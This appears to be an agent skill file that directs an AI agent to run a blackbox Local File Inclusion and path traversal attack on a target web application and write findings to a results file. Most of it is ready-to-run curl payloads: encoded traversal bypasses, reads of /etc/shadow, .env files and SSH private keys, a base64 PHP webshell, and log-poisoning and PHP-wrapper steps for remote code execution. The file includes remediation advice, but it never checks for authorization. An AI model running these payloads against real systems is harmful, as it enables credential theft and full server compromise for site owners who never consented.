---
name: blackbox-lfi
description: >-
  Actively test a target web application for Local File Inclusion (LFI) and
  Path Traversal vulnerabilities using blackbox techniques. Reads
  pentest/target-map.md, injects path traversal sequences into file-referencing
  parameters, attempts to read sensitive system files (/etc/passwd, etc.),
  tests for LFI-to-RCE via log poisoning and PHP wrappers, and writes confirmed
  findings with PoC curl commands to pentest/lfi-results.md. Use when asked to
  find LFI, path traversal, or directory traversal in a blackbox pentest.
---

# Blackbox LFI / Path Traversal Detection

You are actively testing a web application for Local File Inclusion and Path Traversal vulnerabilities without source code access. You will inject traversal sequences into file-referencing parameters and attempt to read sensitive files.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Identify LFI Candidates

Read `pentest/target-map.md` and find parameters that reference files or pages:

**High-confidence candidates**:
- `file`, `path`, `filename`, `filepath`, `page`, `template`, `view`, `doc`, `document`
- `include`, `load`, `read`, `source`, `content`, `module`, `lang`, `locale`, `theme`
- Query params like `?page=about`, `?file=report.pdf`, `?lang=en`
- Download endpoints: `/download?file=invoice.pdf`, `/files/report.txt`
- `?redirect=`, `?url=` when value looks like a local path

Write candidates to `pentest/lfi-recon.md`.

---

## Phase 2: Basic Path Traversal Testing

### Test 1: Direct Traversal

```bash
# Basic ../ traversal
curl -sk "<TARGET_URL>/download?file=../../../etc/passwd"
curl -sk "<TARGET_URL>/page?name=../../../etc/passwd"
curl -sk "<TARGET_URL>/view?doc=../../../etc/passwd"

# Without extension
curl -sk "<TARGET_URL>/download?file=../../../../etc/passwd"

# Absolute path
curl -sk "<TARGET_URL>/download?file=/etc/passwd"
```

**Confirmed LFI** if response contains `root:x:0:0:root:/root:/bin/bash`.

### Test 2: Encoded Traversal Sequences

If basic `../` is filtered, try encoded variants:

```bash
# URL encoded
curl -sk "<TARGET_URL>/page?name=..%2F..%2F..%2Fetc%2Fpasswd"

# Double encoded
curl -sk "<TARGET_URL>/page?name=..%252F..%252F..%252Fetc%252Fpasswd"

# Backslash (Windows)
curl -sk "<TARGET_URL>/page?name=..\..\..\Windows\win.ini"
curl -sk "<TARGET_URL>/page?name=..%5C..%5C..%5CWindows%5Cwin.ini"

# Unicode variants
curl -sk "<TARGET_URL>/page?name=..%EF%BC%8F..%EF%BC%8Fetc%EF%BC%8Fpasswd"

# Null byte (older PHP)
curl -sk "<TARGET_URL>/page?name=../../../etc/passwd%00"
curl -sk "<TARGET_URL>/page?name=../../../etc/passwd%00.jpg"

# Stripped ../ bypass (....// → after strip becomes ../)
curl -sk "<TARGET_URL>/page?name=....//....//....//etc/passwd"
curl -sk "<TARGET_URL>/page?name=..././..././..././etc/passwd"
```

### Test 3: Bypass Prefix/Suffix Restrictions

If the application prepends a base path or appends an extension:

```bash
# If app prepends /var/www/files/ → inject to reach /etc/passwd
curl -sk "<TARGET_URL>/view?file=../../../../../../etc/passwd"

# If app appends .php extension → use null byte (old PHP) or ../ only approach
curl -sk "<TARGET_URL>/page?name=../../../etc/passwd%00"

# If app requires path to start with /uploads/
curl -sk "<TARGET_URL>/file?path=/uploads/../../../etc/passwd"
```

---

## Phase 3: Target Sensitive Files

Once traversal is confirmed, read high-value files:

### Linux Targets
```bash
BASE_TRAVERSAL="../../../../../../"
URL="<TARGET_URL>/download?file=${BASE_TRAVERSAL}"

# System info
curl -sk "${URL}etc/passwd"
curl -sk "${URL}etc/shadow"    # If running as root
curl -sk "${URL}etc/hosts"
curl -sk "${URL}proc/self/environ"   # Environment variables — often contains secrets

# Web server config
curl -sk "${URL}etc/nginx/nginx.conf"
curl -sk "${URL}etc/apache2/apache2.conf"
curl -sk "${URL}etc/nginx/sites-enabled/default"

# Application secrets
curl -sk "${URL}proc/self/cmdline"   # Process command line — reveals app root
curl -sk "${URL}app/.env"
curl -sk "${URL}var/www/html/.env"
curl -sk "${URL}app/config.php"
curl -sk "${URL}var/www/html/config.php"

# SSH keys
curl -sk "${URL}root/.ssh/id_rsa"
curl -sk "${URL}home/ubuntu/.ssh/id_rsa"
```

### Windows Targets
```bash
curl -sk "<TARGET_URL>/file?path=..\..\Windows\win.ini"
curl -sk "<TARGET_URL>/file?path=..\..\Windows\System32\drivers\etc\hosts"
curl -sk "<TARGET_URL>/file?path=C:\Windows\win.ini"
```

---

## Phase 4: PHP-Specific LFI Escalation

If the target is PHP, test dangerous PHP wrappers:

### PHP Filter Wrapper (Extract Source Code)
```bash
# Base64 encode and read PHP source
curl -sk "<TARGET_URL>/page?name=php://filter/convert.base64-encode/resource=index.php"
curl -sk "<TARGET_URL>/page?name=php://filter/convert.base64-encode/resource=config.php"

# Decode the result
curl -sk "<TARGET_URL>/page?name=php://filter/convert.base64-encode/resource=config.php" | \
  base64 -d
```

### PHP Input Wrapper (RCE)
```bash
# If LFI allows include of PHP:// wrapper
curl -sk -X POST "<TARGET_URL>/page?name=php://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "<?php system('id'); ?>"
```

### PHP Data Wrapper (RCE)
```bash
# Base64-encoded PHP webshell
curl -sk "<TARGET_URL>/page?name=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
# Decoded: <?php system($_GET['cmd']); ?>
# Then:
curl -sk "<TARGET_URL>/page?name=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id"
```

### Log Poisoning → RCE

```bash
# Step 1: Poison the log — inject PHP code into User-Agent
curl -sk "<TARGET_URL>/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Step 2: Include the poisoned log file
curl -sk "<TARGET_URL>/page?name=../../../var/log/apache2/access.log&cmd=id"
curl -sk "<TARGET_URL>/page?name=../../../var/log/nginx/access.log&cmd=id"

# Alternative: poison via SSH auth log
# ssh "<?php system(\$_GET['cmd']);?>"@target.com
# curl -sk "<TARGET_URL>/page?name=../../../var/log/auth.log&cmd=id"
```

### /proc/self/fd (Alternative Log Source)
```bash
for fd in $(seq 0 20); do
  echo "Testing /proc/self/fd/$fd:"
  curl -sk "<TARGET_URL>/page?name=../../../proc/self/fd/$fd" | head -5
done
```

---

## Phase 5: Windows LFI Escalation

```bash
# Read IIS config (may contain credentials)
curl -sk "<TARGET_URL>/file?path=..\..\inetpub\wwwroot\web.config"

# Read Windows hosts file
curl -sk "<TARGET_URL>/file?path=..\..\Windows\System32\drivers\etc\hosts"

# Read application config
curl -sk "<TARGET_URL>/file?path=..\..\web.config"
curl -sk "<TARGET_URL>/file?path=..\..\app.config"
```

---

## Output Format

Write findings to `pentest/lfi-results.md`:

```markdown
# LFI / Path Traversal Assessment Results

## Executive Summary
- Parameters tested: [N]
- Confirmed Path Traversal (file read): [N]
- Confirmed LFI-to-RCE: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED LFI - FILE READ] /download - file parameter

- **Endpoint**: `GET /download?file=<path>`
- **Parameter**: `file` (query string)
- **Impact**: Read arbitrary files accessible to the web server process — source code, configs, /etc/passwd, .env files, private keys
- **Evidence**: `/etc/passwd` contents returned in response
- **PoC**:
  ```bash
  # Basic traversal
  curl -sk "https://target.com/download?file=../../../etc/passwd"
  # Expected: root:x:0:0:root:/root:/bin/bash\n...

  # Read application .env file
  curl -sk "https://target.com/download?file=../../../../app/.env"
  # Expected: DATABASE_URL=postgres://user:pass@host/db\nSECRET_KEY=...
  ```
- **Remediation**: Resolve the final path with realpath/os.path.realpath and verify it starts with the intended base directory. Use os.path.basename() to strip directory components. Never pass user input directly to file operations.

### [CONFIRMED LFI→RCE] /page?name= (PHP Log Poisoning)

- **Impact**: Full RCE — attacker can execute arbitrary OS commands
- **PoC**:
  ```bash
  # Step 1: Inject PHP backdoor into access log via User-Agent
  curl -sk "https://target.com/" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

  # Step 2: Include the poisoned log to execute
  curl -sk "https://target.com/page?name=../../../var/log/apache2/access.log&cmd=id"
  # Expected in response: uid=33(www-data)...
  ```
- **Remediation**: Implement directory traversal protection (see above). Additionally, ensure file inclusion never executes code — use readfile() instead of include() if dynamic file loading is required.
```

After writing results, delete `pentest/lfi-recon.md`.

---

## Important Reminders

- Always test multiple encoding variants — WAFs often block only the plaintext `../`.
- `/proc/self/environ` often contains secrets (db passwords, API keys) — extremely valuable.
- PHP filter wrapper (`php://filter/convert.base64-encode`) is a safe, non-destructive way to read source code.
- Null byte injection (`%00`) only works on PHP < 5.3.
- Log poisoning is destructive — it pollutes log files. Only do it against test environments.
- Clean up: delete `pentest/lfi-recon.md` after writing results.
